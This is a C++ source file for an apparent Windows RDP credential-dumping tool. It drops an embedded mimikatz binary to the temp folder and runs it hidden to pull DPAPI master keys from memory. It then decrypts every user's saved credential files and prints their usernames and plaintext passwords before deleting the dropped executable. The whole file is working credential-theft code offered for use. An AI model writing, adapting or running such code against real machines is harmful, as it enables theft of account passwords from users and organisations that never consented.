#include "RDP-credentials-decrypter.h"
#include "mimikatzBin.h"

uint32_t get_cmd_data(const char* pCmd, std::stringstream& ss)
{
	uint32_t u32Ret = 0;
	BOOL bStatus = 0;
	char* pszCmd = nullptr;

	std::stringstream tempss;
	char szBuff[128] = { 0 };

	char* pszData = nullptr;

	char szEnvPath[128] = { 0 };
	GetTempPathA(128, szEnvPath);
	strcat(szEnvPath, "\\logs");
	CreateDirectoryA(szEnvPath, nullptr);
	GetTempPathA(128, szEnvPath);

	do
	{
		size_t cmdLen = strlen(pCmd) + 1;
		pszCmd = (char*)malloc(cmdLen * sizeof(wchar_t));
		if (pszCmd == nullptr)
		{
			break;
		}
		strcpy(pszCmd, pCmd);

		DWORD dwLen = 0;
		HANDLE hReadPipe = NULL;
		HANDLE hWritePipe = NULL;
		SECURITY_ATTRIBUTES securityAttributes = { sizeof(securityAttributes) };
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		securityAttributes.bInheritHandle = TRUE;
		securityAttributes.lpSecurityDescriptor = NULL;
		bStatus = ::CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
		SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
		if (FALSE == bStatus)
		{
			u32Ret = GetLastError();
			break;
		}
		si.wShowWindow = SW_HIDE;
		si.hStdError = hWritePipe;
		si.hStdOutput = hWritePipe;
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		PVOID pOldValue = nullptr;
		Wow64DisableWow64FsRedirection(&pOldValue);
		bStatus = ::CreateProcessA(nullptr, pszCmd, NULL, NULL, TRUE, 0, NULL, szEnvPath, &si, &pi);
		Wow64RevertWow64FsRedirection(pOldValue);
		if (FALSE == bStatus)
		{
			u32Ret = GetLastError();
			break;
		}

		memset(szBuff, 0, sizeof(szBuff));
		while (true)
		{
			u32Ret = WaitForSingleObject(pi.hProcess, 100);
			if (u32Ret != WAIT_TIMEOUT)
			{
				u32Ret = PeekNamedPipe(hReadPipe, nullptr, 0, nullptr, &dwLen, nullptr);
				if (!dwLen)
				{
					break;
				}
			}
			while (true)
			{
				u32Ret = PeekNamedPipe(hReadPipe, nullptr, 0, nullptr, &dwLen, nullptr);
				if (!u32Ret || !dwLen)
				{
					break;
				}
				if (!ReadFile(hReadPipe, szBuff, sizeof(szBuff) - 1, &dwLen, NULL))
				{
					break;
				}
				szBuff[dwLen] = 0;
				tempss << szBuff;
			}
		}
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);

		ss.str("");
		ss << tempss.str();

		u32Ret = 0;
	} while (false);

	if (pszCmd != nullptr)
	{
		free(pszCmd);
		pszCmd = nullptr;
	}

	if (pszData != nullptr)
	{
		free(pszData);
		pszData = nullptr;
	}

	return u32Ret;
}

// get credential file path
std::vector<std::string> get_credentials_filepath()
{
    std::vector<std::string> credentials_file_path_vec;
    std::vector<std::string> user_path_vec;
    std::string credential_path = "C:\\Users\\";
    long hFile = 0;
    struct _finddata_t fileInfo;
    std::string path_name; 
    if ((hFile = _findfirst(path_name.assign(credential_path).append("\\*").c_str(), &fileInfo)) == -1) {
        return credentials_file_path_vec;
    }
    do
    {
        if (!strchr(fileInfo.name, '.') && fileInfo.attrib & _A_SUBDIR)
            user_path_vec.push_back(fileInfo.name);
    } while (_findnext(hFile, &fileInfo) == 0);
    for (auto user_name : user_path_vec)
    {
        credential_path = "C:\\Users\\";
        credential_path += user_name;
        credential_path += "\\AppData\\Local\\Microsoft\\Credentials";
        if ((hFile = _findfirst(path_name.assign(credential_path).append("\\*").c_str(), &fileInfo)) == -1) {
            continue;
        }
        do
        {
            if (!(fileInfo.attrib & _A_SUBDIR))
                credentials_file_path_vec.push_back(credential_path + "\\" + fileInfo.name);
        } while (_findnext(hFile, &fileInfo) == 0);
        _findclose(hFile);
    }
    return credentials_file_path_vec;
}

std::string save_data_to_file(void* data, size_t size, std::string suffix)
{
	char strTempPath[MAX_PATH] = { 0 };
	char strTempFileName[MAX_PATH] = { 0 };
	char strRandomPrefix[4] = { 0 };
	DWORD dwStatus = 0;
	FILE* fp = nullptr;

	std::string strTempFile = "";
	do
	{
		srand((unsigned int)time(nullptr));
		for (int i = 0; i < 3; ++i)
		{
			strRandomPrefix[i] = rand() % 26 + 'a';
		}

		dwStatus = GetTempPathA(MAX_PATH, strTempPath);
		if (dwStatus == 0)
		{
			break;
		}

		dwStatus = GetTempFileNameA(strTempPath, strRandomPrefix, 0, strTempFileName);
		if (dwStatus == 0)
		{
			break;
		}
		strTempFile = strTempFileName;
		strTempFile += suffix;

		fp = fopen(strTempFile.c_str(), "wb");
		if (fp == nullptr)
		{
			break;
		}

		fwrite(data, 1, size, fp);
	} while (false);

	if (fp != nullptr)
	{
		fclose(fp);
		fp = nullptr;
	}

	return std::move(strTempFile);
}

std::pair<std::string, std::string> get_credential_file(std::string file_path, std::string mimikatz_path)
{
	std::stringstream command;
	command <<  mimikatz_path << " \"dpapi::cred /in:"<< file_path<<"\" \"exit\"";
	get_cmd_data(command.str().c_str(), command);
	return make_pair(analysis_mimikatz_cred(command), file_path);
}

std::list<std::pair<std::string, std::string>> get_credential_files(std::string mimikatz_path)
{
	auto file_path_vec = get_credentials_filepath();
	std::list<std::pair<std::string, std::string>> credfile_list;
	for (auto credential_file : file_path_vec)
	{
		credfile_list.push_back(get_credential_file(credential_file, mimikatz_path));
	}
	return std::move(credfile_list);
}

std::list<std::pair<std::string, std::string>> get_mimikatz_dpapi(std::string mimikatz_path)
{
	std::stringstream command;
	command << mimikatz_path << " \"privilege::debug\" \"sekurlsa::dpapi\" \"exit\"";
	get_cmd_data(command.str().c_str(), command);
	return std::move(analysis_mimikatz_dpapi(command));
}

std::list<std::pair<std::string, std::string>> analysis_mimikatz_dpapi(std::stringstream& ss)
{
	auto pfnReadData = [](std::stringstream& ss, std::string& str)
	{
		ss >> str;
		ss.get();
		str = "";
		std::getline(ss, str);
		auto pos = str.find('\r');
		if (pos != std::string::npos)
		{
			str.pop_back();
		}
	};

	std::list<std::pair<std::string, std::string>> dpapi_list;
	std::string str;
	bool bIsInstance = false;
	std::pair<std::string, std::string> apapi_info;
	while (ss.eof() == false)
	{
		if (str == "")
		{
			if (bIsInstance == true)
			{
				dpapi_list.push_back(apapi_info);
			}
			bIsInstance = false;
		}

		if (str.find("GUID") != std::string::npos)
		{
			bIsInstance = true;

			auto pos = str.find(":");
			if (pos == str.length() - 1)
			{
				apapi_info.first = "";
			}
			else
			{
				apapi_info.first = std::string(str, pos + 2);
				if (apapi_info.first == "(null)")
				{
					apapi_info.first = "";
				}
			}
		}

		if (str.find("MasterKey") != std::string::npos)
		{
			auto pos = str.find(":");
			if (pos == str.length() - 1)
			{
				apapi_info.second = "";
			}
			else
			{
				apapi_info.second = std::string(str, pos + 2);
				if (apapi_info.second == "(null)")
				{
					apapi_info.second = "";
				}
			}
		}

		pfnReadData(ss, str);
	}
	return std::move(dpapi_list);
}

std::string analysis_mimikatz_cred(std::stringstream& ss)
{
	std::list<std::string> cred_list;
	std::string str;
	while (!ss.eof())
	{
		if (str.find("guidMasterKey") != std::string::npos)
		{
			auto key = std::string(str, str.find(":") + 2); 
			erase_linefeed(key);
			return std::move(key);
		}
		std::getline(ss, str);
	}
}

std::list<std::pair<std::string, std::string>> encrypt_credential_files(std::string mimikatz_path)
{
	auto dpapi_list = get_mimikatz_dpapi(mimikatz_path);
	auto cred_list = get_credential_files(mimikatz_path);
	std::list<std::pair<std::string, std::string>> user_info_list;
	for (auto dpapi : dpapi_list)
	{
		for (auto cred : cred_list)
		{
			if (!dpapi.first.compare(cred.first))
			{
				auto user_info = decrypt_credential_file(make_pair(dpapi.second, cred.second), mimikatz_path);
				if (user_info.second.length() && user_info.first.length() && user_info.second.length() < 30)
					user_info_list.push_back(user_info);
			}
		}
	}
	return std::move(user_info_list);
}

std::pair<std::string, std::string> decrypt_credential_file(std::pair<std::string, std::string> cred_info, std::string mimikatz_path)
{
	std::stringstream command;
	command << mimikatz_path << " \"dpapi::cred /in:" << cred_info.second << " /masterkey:" << cred_info.first << "\" \"exit\"";
	get_cmd_data(command.str().c_str(), command);
	return std::move(analysis_mimikatz_cred_with_key(command));
}

std::pair<std::string, std::string> analysis_mimikatz_cred_with_key(std::stringstream& ss)
{
	std::string str;
	std::string user_name;
	std::string password;
	std::pair<std::string, std::string> user_info;
	while (ss.eof() == false)
	{
		if (str.find("UserName") != std::string::npos)
		{
			user_name = std::string(str, str.find(":") + 2);
			erase_linefeed(user_name);
		}

		if (str.find("CredentialBlob") != std::string::npos)
		{
			password = std::string(str, str.find(":") + 2);
			erase_linefeed(password);
		}
		if (!user_name.empty() && !password.empty())
		{
			user_info.first = user_name;
			user_info.second = password;
			break;
		}
		std::getline(ss, str);
	}
	return std::move(user_info);
}

void erase_linefeed(std::string& str)
{
	if (str.length()==0)
	{
		return;
	}
	str.erase(str.find('\r'), 1);
}
int main()
{
	auto mimikatz_path = save_data_to_file(g_mimikatzBin, sizeof(g_mimikatzBin), ".exe");
	auto user_info_list = encrypt_credential_files(mimikatz_path);
	for (auto user_info : user_info_list)
	{
		std::cout << "user name:" << user_info.first << "  password:" << user_info.second << std::endl;
	}
	// delete mimikatz exe
	remove(mimikatz_path.c_str());
	system("pause");
}